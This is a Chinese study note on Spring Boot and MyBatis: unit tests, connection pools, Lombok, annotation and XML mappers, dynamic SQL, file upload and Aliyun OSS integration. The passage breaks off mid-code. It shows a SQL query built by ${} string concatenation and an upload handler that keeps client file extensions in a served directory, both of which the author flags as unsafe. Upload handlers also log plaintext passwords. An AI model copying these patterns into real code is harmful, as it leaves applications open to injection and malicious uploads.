进行单元测试\n\n![image-20250420163551135](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420163551135.png)\n\n```java\npackage com.wwwtty.mybatisdemo;\n\nimport com.wwwtty.mybatisdemo.mapper.UserMapper;\nimport com.wwwtty.mybatisdemo.pojo.User;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\n\nimport java.util.List;\n\n@SpringBootTest\nclass MybatisDemoApplicationTests {\n\n        @Autowired\n        UserMapper userMapper;\n\n        @Test\n        public void UserListTest(){\n                List<User> list = userMapper.list();\n                list.stream().forEach(user ->{\n                        System.out.println(user);\n                });\n        }\n}\n```\n\n@SpringBootTest进行单元测试时，也会加载整个springboot环境\n\n![image-20250420170435640](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420170435640.png)\n\n### 配置sql提示\n\n![image-20250420201158998](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420201158998.png)\n\n![image-20250420201430768](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420201430768.png)\n\n![image-20250420201500926](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420201500926.png)\n\n![image-20250420201524960](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420201524960.png)\n\n![image-20250420201822363](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420201822363.png)\n\n![image-20250420202059036](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420202059036.png)\n\n功能强大qaq：\n\n![image-20250420202159898](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420202159898.png)\n\n## JDBC\n\n（面向接口编程）\n\nJDBC只提供接口，由数据库厂商实现具体方法\n\n ![image-20250420202340362](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420202340362.png)\n\n缺点：\n\n![image-20250420202552672](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420202552672.png)\n\n![image-20250420202708569](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420202708569.png)\n\n## 数据库连接池\n\n![image-20250420202838234](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420202838234.png)\n\n ![image-20250420202924564](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420202924564.png)\n\n![image-20250420203009321](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420203009321.png)\n\n![image-20250420203204017](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420203204017.png)\n\n![image-20250420203059719](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420203059719.png)\n\n实现了DataSource接口\n\n![image-20250420203123699](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420203123699.png)\n\n### 切换连接池\n\n只需要引入maven依赖\n\n![image-20250420203258391](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420203258391.png)\n\n```XML\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid-spring-boot-starter</artifactId>\n    <version>1.2.8</version>\n</dependency>\n```\n\n本地测试还得在properties文件加上：\n\n```properties\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\n```\n\n才能：\n\n![image-20250420204600465](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420204600465.png)\n\n或者：\n\n由于我的springboot版本为：\n\n![image-20250420205002180](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420205002180.png)\n\n因此坐标中的druid-spring-boot-starter应该改成druid-spring-boot-3-starter\n\n```xml\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid-spring-boot-3-starter</artifactId>\n    <version>1.2.22</version>\n</dependency>\n```\n\n![image-20250420204922741](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420204922741.png)\n\n另一种配置方式\n\n![image-20250420205145225](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420205145225.png)\n\n## lombok\n\npojo类算上getter/setter等方法之后，太过于臃肿\n\n![image-20250420205336460](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420205336460.png)\n\n![image-20250420205419808](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420205419808.png)\n\n### 引入依赖\n\n```xml\n<dependency>\n    <groupId>org.projectlombok</groupId>\n    <artifactId>lombok</artifactId>\n</dependency>\n```\n\n### @Data\n\n包含了@Getter，@Setter，@ToString，@EqualsAndHashCode\n\n不包含构造器\n\n```java\npackage com.wwwtty.mybatisdemo.pojo;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.Getter;\nimport lombok.NoArgsConstructor;\n\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\npublic class User {\n        private Integer id;\n        private String username;\n        private String password;\n        private String email;\n}\n```\n\n![image-20250420210030897](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420210030897.png)\n\n上述注解的作用在于根据注解生成一系列方法\n\nUser的字节码文件反编译：\n\n![image-20250420210155253](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420210155253.png)\n\n![image-20250420210230204](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420210230204.png)\n\n## Mybatis基础操作\n\n## 删除操作\n\n### @Delete\n\n```java\npackage com.wwwtty.basic_op.Mapper;\n\nimport org.apache.ibatis.annotations.Delete;\nimport org.apache.ibatis.annotations.Mapper;\n\n@Mapper\npublic interface EmpMapper {\n        @Delete(\"delete from emp where id = 1\")\n        void delete();\n}\n```\n\n这么做的局限性是，id是静态的，但是前端传进来的id参数肯定是动态的\n\n### 传递参数\n\n在@Delete中将参数用`#{}`包围\n\n![image-20250426152414630](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426152414630.png)\n\n```java\npackage com.wwwtty.basic_op.Mapper;\n\nimport org.apache.ibatis.annotations.Delete;\nimport org.apache.ibatis.annotations.Mapper;\n\n@Mapper\npublic interface EmpMapper {\n        @Delete(\"delete from emp where id = #{id}\")\n        void delete(Integer id);\n}\n```\n\n如何拿到影响的记录数呢，改一下返回值就可以\n\n```java\npackage com.wwwtty.basic_op.Mapper;\n\nimport org.apache.ibatis.annotations.Delete;\nimport org.apache.ibatis.annotations.Mapper;\n\n@Mapper\npublic interface EmpMapper {\n        @Delete(\"delete from emp where id = 1\")\n        Integer delete();\n}\n```\n\n```java\n@Test\nvoid contextLoads() {\n    System.out.println(empMapper.delete(5));\n}\n```\n\n![image-20250426152241559](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426152241559.png)\n\n### 测试\n\n表内容如下：\n\n![image-20250426151816452](C:/Users/27251/Desktop/笔记/javaweb/image-20250426151816452.png)\n\n用@Autowired注入\n\n```java\npackage com.wwwtty.basic_op;\n\nimport com.wwwtty.basic_op.Mapper.EmpMapper;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\n\n@SpringBootTest\nclass BasicOpApplicationTests {\n        @Autowired\n        private EmpMapper empMapper;\n        @Test\n        void contextLoads() {\n                empMapper.delete(5);\n        }\n}\n```\n\n![image-20250426151830288](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426151830288.png)\n\n### Mybatis日志输出\n\n```properties\n#mybatis日志输出,输出到控制台\nmybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl\n```\n\n运行结果：![image-20250426152754662](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426152754662.png)\n\n使用了参数化查询技术（预编译查询）\n\n### 预编译SQL优势\n\n![image-20250426153102976](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426153102976.png)\n\n### 参数占位符\n\n![image-20250426153355879](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426153355879.png)\n\n## 新增操作\n\n### @Insert\n\ninsert中的字段太多，可以直接封装成一个对象\n\n用lombok封装getter/setter等方法\n\n![image-20250426154316266](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426154316266.png)\n\n```java\npackage com.wwwtty.mybatis_insert.Mapper;\n\nimport com.wwwtty.mybatis_insert.pojo.Emp;\nimport org.apache.ibatis.annotations.Insert;\nimport org.apache.ibatis.annotations.Mapper;\n\n@Mapper\npublic interface EmpMapper {\n        @Insert(\"insert into emp (id,name,email) values (#{id},#{name},#{email})\")\n        void Insert(Emp emp);\n}\n```\n\n```java\npackage com.wwwtty.mybatis_insert;\n\nimport com.wwwtty.mybatis_insert.Mapper.EmpMapper;\nimport com.wwwtty.mybatis_insert.pojo.Emp;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\n\n@SpringBootTest\nclass MybatisInsertApplicationTests {\n        @Autowired\n        EmpMapper empMapper;\n        @Test\n        void contextLoads() {\n                Emp emp = new Emp();\n                emp.setId(5);\n                emp.setEmail(\"114514@acceed.com\");\n                emp.setName(\"淳平\");\n\n                empMapper.Insert(emp);\n        }\n}\n```\n\n日志输出：\n\n![image-20250426155110184](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426155110184.png)\n\n### 主键返回\n\n![image-20250426155301757](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426155301757.png)\n\n#### @Options\n\n```java\npackage com.wwwtty.mybatis_insert.Mapper;\n\nimport com.wwwtty.mybatis_insert.pojo.Emp;\nimport org.apache.ibatis.annotations.Insert;\nimport org.apache.ibatis.annotations.Mapper;\nimport org.apache.ibatis.annotations.Options;\n\n@Mapper\npublic interface EmpMapper {\n\n        /*\n        * keyProperty:主键值赋值给实体类哪个对象\n        * useGeneratedKeys:获取主键值\n        * */\n        @Options(keyProperty = \"id\", useGeneratedKeys = true)\n        @Insert(\"insert into emp (name,email) values (#{name},#{email})\")\n        void Insert(Emp emp);\n}\n```\n\n这样一来getId()就不会返回null\n\n```java\npackage com.wwwtty.mybatis_insert;\n\nimport com.wwwtty.mybatis_insert.Mapper.EmpMapper;\nimport com.wwwtty.mybatis_insert.pojo.Emp;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\n\n@SpringBootTest\nclass MybatisInsertApplicationTests {\n        @Autowired\n        EmpMapper empMapper;\n        @Test\n        void contextLoads() {\n                Emp emp = new Emp();\n//                emp.setId(5);\n                emp.setEmail(\"114514@acceed.com\");\n                emp.setName(\"林丹\");\n\n                empMapper.Insert(emp);\n                System.out.println(emp.getId());\n        }\n}\n```\n\n![image-20250426161006342](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426161006342.png)\n\n## 更新操作\n\n### @Update\n\n![image-20250426161909725](C:/Users/27251/Desktop/笔记/javaweb/image-20250426161909725.png)\n\n```java\npackage com.wwwtty.mybatis_update.Mapper;\n\nimport com.wwwtty.mybatis_update.pojo.Emp;\nimport org.apache.ibatis.annotations.Mapper;\nimport org.apache.ibatis.annotations.Update;\n\n@Mapper\npublic interface EmpMapper {\n        @Update(\"update emp set name=#{name},email=#{email} where id=#{id}\")\n        void update(Emp emp);\n}\n```\n\n执行结果：\n\n![image-20250426162430561](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426162430561.png)\n\n![image-20250426162436087](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426162436087.png)\n\n## 查询操作\n\n```java\npackage com.wwwtty.mybatis_select.Mapper;\n\nimport com.wwwtty.mybatis_select.pojo.Emp;\nimport org.apache.ibatis.annotations.Mapper;\nimport org.apache.ibatis.annotations.Select;\n\nimport java.util.List;\n\n@Mapper\npublic interface EmpMapper {\n        @Select(\"select* from emp where id = #{id}\")\n        List<Emp> getById(Integer id);\n}\n```\n\n```java\npackage com.wwwtty.mybatis_select;\n\nimport com.wwwtty.mybatis_select.Mapper.EmpMapper;\nimport com.wwwtty.mybatis_select.pojo.Emp;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.context.SpringBootTest;\n\n@SpringBootTest\nclass MybatisSelectApplicationTests {\n        @Autowired\n        EmpMapper empMapper;\n        @Test\n        void contextLoads() {\n                Emp emp = new Emp();\n                emp.setId(5);\n                System.out.println(empMapper.getById(5));\n        }\n}\n```\n\n运行结果：\n\n![image-20250426164017496](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426164017496.png)\n\n### 数据封装\n\n![image-20250426164121784](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426164121784.png)\n\n![image-20250426164220088](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426164220088.png)\n\n### @Results，@Result\n\n```java\n/*\n* column:字段名\n* property:类中属性名\n* */\n@Results({\n    @Result(column = \"\",property = \"\"),\n    @Result(column = \"\",property = \"\")\n})\n```\n\n### 开启mybatis驼峰命名自动映射开关 a_column -> aColumn\n\n```properties\n#开启mybatis驼峰命名自动映射开关(直接搜索骆驼(camel))\nmybatis.configuration.map-underscore-to-camel-case=true\n```\n\n## 条件查询\n\n![image-20250426165935370](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426165935370.png)\n\n![image-20250426165951149](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426165951149.png)\n\n```mysql\nselect * from user where name like '%张%' and gender=1 and entrydate between '2010-01-01' and '2020-01-01' order by update_time desc\n```\n\n这些参数不好封装到一个对象中去，直接传参数\n\n```java\n@Select(\"select * from user where name like '%${name}%' and gender=#{gender} and \" +\n        \"entrydate between #{begin} and #{end} order by update_time desc\")\nList<User> list(String name, Short gender, LocalDate begin,LocalDate end);\n```\n\n**进行模糊匹配的时候，要用'%%'的形式，这样就不能用预编译的#{}(占位符不能出现在引号内)，需要用拼接sql的${}(不推荐)**\n\n```java\n@Test\n    void test() {\n    List<User> res = empMapper.list(\"张\", (short) 1, LocalDate.of(2010, 1, 1), LocalDate.of(2020, 1, 1));\n    res.stream().forEach(user -> {\n    \tSystem.out.println(user);\n    });\n}\n```\n\n![image-20250426171629304](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426171629304.png)\n\n怎么解决拼接的问题\n\n### concat()\n\n```java\n@Select(\"select * from user where name like concat('%',#{name},'%') and gender=#{gender} and \" +\n        \"entrydate between #{begin} and #{end} order by update_time desc\")\nList<User> list(String name, Short gender, LocalDate begin,LocalDate end);\n```\n\n![image-20250426172027177](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426172027177.png)\n\n早期版本不会保留形参名\n\n![image-20250426172059490](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250426172059490.png)\n\n## XML映射文件\n\n![image-20250428203330256](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428203330256.png)\n\n![image-20250428203708238](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428203708238.png)\n\n与包名一致\n\n![image-20250428204102085](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428204102085.png)\n\n与接口名一致\n\n![image-20250428204545697](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428204545697.png)\n\nxml文件的约束：https://mybatis.p2hp.com/getting-started.html\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"https://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n<!--mapper根标签-->\n<mapper namespace=\"com.wwwtty.xml_reflect.mapper.EmpMapper\">\n        <!--    id:Mapper类中的方法名    -->\n        <!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List<User>,填的就是User的全类名     -->\n        <select id=\"list\" resultType=\"\">\n                \n        </select>\n</mapper>\n```\n\n获取全类名：\n\n![image-20250428204919955](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428204919955.png)\n\n原查询语句：\n\n```java\n@Select(\"select * from user where name like concat('%',#{name},'%') and gender=#{gender} and \" +\n        \"entrydate between #{begin} and #{end} order by update_time desc\")\nList<User> list(String name, Short gender, LocalDate begin,LocalDate end);\n```\n\n\n\n改用xml映射的方式：\n\n如果xml中sql语句没有高亮，上下文操作中选择注入语言\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"https://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n<!--mapper根标签-->\n<mapper namespace=\"com.wwwtty.xml_reflect.mapper.EmpMapper\">\n        <!--    id:Mapper类中的方法名    -->\n        <!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List<User>,填的就是User的全类名     -->\n        <select id=\"list\" resultType=\"com.wwwtty.xml_reflect.pojo.User\">\n                select * from user where name like concat('%',#{name},'%') and gender=#{gender} and\n                entrydate between #{begin} and #{end} order by update_time desc\n        </select>\n</mapper>\n```\n\nxml映射适合于复杂sql\n\n## 动态sql\n\n![image-20250428210744924](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428210744924.png)\n\n### < if >\n\n![image-20250428211702486](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428211702486.png)\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"https://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n<!--mapper根标签-->\n<mapper namespace=\"com.wwwtty.xml_reflect.mapper.EmpMapper\">\n        <!--    id:Mapper类中的方法名    -->\n        <!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List<User>,填的就是User的全类名     -->\n        <select id=\"list\" resultType=\"com.wwwtty.xml_reflect.pojo.User\">\n                select *\n                from user\n                where\n                <if test=\"name != null\">\n                        name like concat('%', #{name}, '%')\n                </if>\n                <if test=\"gender != null\">\n                        and gender = #{gender}\n                </if>\n                <if test=\"begin != null and end != null\">\n                        and entrydate between #{begin} and #{end}\n                </if>\n                order by update_time desc\n        </select>\n</mapper>\n```\n\n```java\nempMapper.list(name,null,null,end);\n```\n\n相应的sql语句：\n\n![image-20250428212313281](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428212313281.png)\n\n### < where >\n\n在上面的例子中，如果我们只筛选性别：\n\n![image-20250428212633326](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428212633326.png)\n\n但是这个and还很不好删除（容易别的地方出错）\n\n作用：根据if的结果（子元素），自动添加/删除where；同时自动删除多余的and和or\n\n使用< where >解决\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"https://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n<!--mapper根标签-->\n<mapper namespace=\"com.wwwtty.xml_reflect.mapper.EmpMapper\">\n        <!--    id:Mapper类中的方法名    -->\n        <!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List<User>,填的就是User的全类名     -->\n        <select id=\"list\" resultType=\"com.wwwtty.xml_reflect.pojo.User\">\n                        select *\n                        from user\n                            <where>\n                                    <if test=\"name != null\">\n                                            name like concat('%', #{name}, '%')\n                                    </if>\n                                    <if test=\"gender != null\">\n                                            and gender = #{gender}\n                                    </if>\n                                    <if test=\"begin != null and end != null\">\n                                            and entrydate between #{begin} and #{end}\n                                    </if>\n                                    order by update_time desc\n                            </where>\n        </select>\n</mapper>\n```\n\n运行生成的sql：\n\n![image-20250428213048653](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428213048653.png)\n\n### < set >\n\n去除set中多余的逗号\n\n#### 案例:动态更新\n\n如果我们这样写动态更新的xml配置文件\n\n```xml\n<update id=\"update\">\n    update user\n    set\n    <if test=\"username != null\">\n        username=#{username},\n    </if>\n    <if test=\"password != null\">\n        password=#{password},\n    </if>\n    <if test=\"name != null\">\n        name=#{name},\n    </if>\n    <if test=\"gender != null\">\n        gender=#{gender},\n    </if>\n    <if test=\"image != null\">\n        image=#{image},\n    </if>\n    <if test=\"job != null\">\n        job=#{job},\n    </if>\n    <if test=\"entrydate != null\">\n        entrydate=#{entrydate},\n    </if>\n    <if test=\"deptId != null\">\n        dept_id=#{deptId},\n    </if>\n    <if test=\"createDate != null\">\n        create_time=#{createTime},\n    </if>\n\n    <if test=\"updateTime != null\">\n        update_time=#{updateTime}\n    </if>\n    where id = #{id}\n</update>\n```\n\n![image-20250428215649758](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428215649758.png)\n\n会有多一个逗号的情况\n\n使用 < set >解决\n\n![image-20250428215812928](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250428215812928.png) \n\n\n\n### < foreach >\n\n场景：批量删除\n\n```sql\ndelete from user where id in(3,4,5);\n```\n\n```java\nvoid deleteByIds(List<Integer> list);\n```\n\n```xml\n<delete id=\"deleteByIds\">\n    <foreach collection=\"\" item=\"\" separator=\"\" open=\"\" close=\"\">\n\n    </foreach>\n</delete>\n```\n\n- collection:要遍历的集合\n\n- item:遍历出的元素\n\n- separator:分隔符\n\n- open:遍历开始前拼接的sql片段\n\n- close:遍历结束后拼接的sql片段\n\n    ```xml\n    <!--    delete from user where id in(3,4,5)    -->\n    <delete id=\"deleteByIds\">\n        delete from user where id in\n        <foreach collection=\"list\" item=\"id\" separator=\",\" open=\"(\" close=\")\">\n            #{id}\n        </foreach>\n    </delete>\n    ```\n\n    \n\n### < sql >\n\n< sql >用于封装一些重复使用的sql片段，并分配一个唯一的id\n\n### < include >\n\n用< include >包含< sql >封装的sql片段，用refid=id从而完成包含\n\n```java\nvoid selectArgs();\n\nvoid selectById();\n```\n\n\n\n```xml\n<sql id=\"basicSelect\">\n    select username,\n    password,\n    name,\n    gender,\n    id,\n    username,\n    password,\n    name,\n    gender,\n    image,\n    job,\n    entrydate,\n    dept_id,\n    create_time,\n    update_time\n    from user\n</sql>\n\n<select id=\"selectArgs\">\n    <include refid=\"basicSelect\" />\n</select>\n<select id=\"selectById\">\n    <include refid=\"basicSelect\" />\n\n</select>\n```\n\n![image-20250429211401588](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250429211401588.png)\n\n\n\n## 文件上传\n\n### 前端表单：\n\n```html\n<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">\n    <input type=\"text\" name=\"name\">\n    <input type=\"password\" name=\"passwd\">\n    <input type=\"file\" name=\"file\">\n    <button type=\"submit\">submit</button>\n</form>\n```\n\n![image-20250527213914701](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527213914701.png)\n\n若不指定enctype=\"multipart/form-data\",上传时只会上传文件名\n\n![image-20250527214515050](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527214515050.png)\n\n![image-20250527214520805](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527214520805.png)\n\n改成enctype=\"multipart/form-data\"\n\n![image-20250527214546829](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527214546829.png)\n\n请求中有了文件内容\n\n![image-20250527214629513](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527214629513.png)\n\n![image-20250527214745685](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527214745685.png)\n\n### 后端:\n\n```java\n@Slf4j\n@RestController\npublic class UploadController {\n        @PostMapping(\"/upload\")\n        public Result upload(String name,String passwd,@RequestParam(\"file\") MultipartFile image){\n                log.info(\"用户名:{},密码:{},收到文件:{}\",name,passwd,image);\n                return Result.success();\n        }\n}\n```\n\n进行测试:\n\n![image-20250527220342050](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250527220342050.png)\n\n#### 本地存储\n\n服务端，接收到上传的文件后，存储在本地服务器磁盘\n\n##### demo:\n\n在static目录下新建了一个upload目录\n\n![image-20250528154900532](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528154900532.png)\n\n```java\n@Slf4j\n@RestController\npublic class UploadController {\n        @PostMapping(\"/upload\")\n        public Result upload(String name,String passwd,@RequestParam(\"file\") MultipartFile image) throws Exception {\n                log.info(\"用户名:{},密码:{},收到文件:{}\",name,passwd,image);\n                //获取原始文件名\n                String fileName =  image.getOriginalFilename();\n\n                //本地存储\n                image.transferTo(new File(\"static/upload\"+fileName));\n                \n                return Result.success();\n        }\n}\n```\n\n##### postman测试\n\n![image-20250528155150879](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528155150879.png)\n\n![image-20250528155649268](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528155649268.png)\n\n![image-20250528155636701](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528155636701.png)\n\n##### 存在问题:\n\n如果两个用户上传了相同名字的文件，那么就覆盖了\n\n所以我们需要构造唯一的文件名\n\n###### 使用uuid\n\n```java\n@Test\nvoid contextLoads() {\n    String uuid = UUID.randomUUID().toString();\n    System.out.println(uuid);\n}\n```\n\n###### 简单的解决:(这么做有漏洞)\n\n```java\n@PostMapping(\"/upload\")\npublic Result upload(String name,String passwd,@RequestParam(\"file\") MultipartFile image) throws Exception {\n    log.info(\"用户名:{},密码:{},收到文件:{}\",name,passwd,image);\n    //获取原始文件名\n    String originalFilename =  image.getOriginalFilename();\n\n    //最后一个.的位置\n    int index = originalFilename.lastIndexOf('.');\n\n    //获取拓展名\n    String extName = originalFilename.substring(index);\n\n    //拼接文件名\n    String fileName = UUID.randomUUID().toString()+extName;\n\n    //本地存储\n    image.transferTo(new File(\"D:\\\\JavaWeb\\\\Spring-Mybatis-demo\\\\src\\\\main\\\\resources\\\\static\\\\upload\\\\\"+fileName));\n\n    return Result.success();\n}\n```\n\n如果上传一个大文件\n\n![image-20250528161104341](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528161104341.png)\n\n这是因为\n\n![image-20250528161122796](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528161122796.png)\n\napplication.properties中\n\n```properties\n#单个文件限制大小\nspring.servlet.multipart.max-file-size=10MB\n#单个请求上传大小\nspring.servlet.multipart.max-request-size=100MB\n```\n\n![image-20250528161605915](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528161605915.png)\n\n#### 云存储\n\n![image-20250528161927187](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528161927187.png)\n\n[官方文档](https://help.aliyun.com/zh/oss/developer-reference/getting-started?spm=a2c4g.11186623.6.919.7c264562C2Fjfs)\n\n[文件上传SDK](https://help.aliyun.com/zh/oss/developer-reference/simple-upload-11?spm=a2c4g.11186623.0.0.2a7956e5TEAO8J#concept-84781-zh)\n\n##### 复制官方代码\n\n![image-20250528170128371](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528170128371.png)\n\n##### 获取endpoint\n\n![image-20250528170345696](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528170345696.png)\n\n##### 设置上传到OSS中的文件名以及要上传的文件路径\n\n```java\n// 在OSS中叫什么名字\nString objectName = \"test.md\";\n// 填写本地文件的完整路径，例如D:\\\\localpath\\\\examplefile.txt。\n// 如果未指定本地路径，则默认从示例程序所属项目对应本地路径中上传文件流。\nString filePath= \"D:\\\\My_Blogs\\\\myblogs\\\\source\\\\_posts\\\\Vue.md\";\n// 填写Bucket所在地域。以华东1（杭州）为例，Region填写为cn-hangzhou。\n```\n\n![image-20250528171849653](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528171849653.png)\n\nbucket文件列表中查看\n\n![image-20250528171915167](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250528171915167.png)\n\n#### 集成Aliyun-OSS\n\n##### 接口文档\n\n![image-20250529134903683](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529134903683.png)\n\n![image-20250529134922220](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529134922220.png)\n\n![image-20250529134944310](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250529134944310.png)\n\n##### 工具类AliOSSUtils\n\n官方代码改写\n\n没有写成静态方法，就用IOC容器注入;工具类不属于三层架构，直接使用@Component注解\n\n```java\n@Slf4j\n@Component\npublic class AliOSSUtils {\n\n        // 获取上传的文件的输入流\n        // Endpoint以华东1（杭州）为例，其它Region请按实际情况填写。\n        String endpoint = \"https://oss-cn-chengdu.aliyuncs.com\";\n        // 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。\n        String bucketName = \"k4n9l4n\";\n        String region = \"cn-chengdu\";\n\n        /**\n         * 实现上传图片到OSS\n         */\n        public String upload(MultipartFile file) throws Exception {\n                String oringinalFileName = file.getOriginalFilename();\n                String fileName = UUID.randomUUID().toString()+oringinalFileName.substring(oringinalFileName.lastIndexOf(\".\"));\n\n                EnvironmentVariableCredentialsProvider credentialsProvider = CredentialsProviderFactory.newEnvironmentVariableCredentialsProvider();\n                // 创建OSSClient实例。\n                // 当OSSClient实例不再使用时，调用shutdown方法以释放资源。\n                ClientBuilderConfiguration clientBuilderConfiguration = new ClientBuilderConfiguration();\n                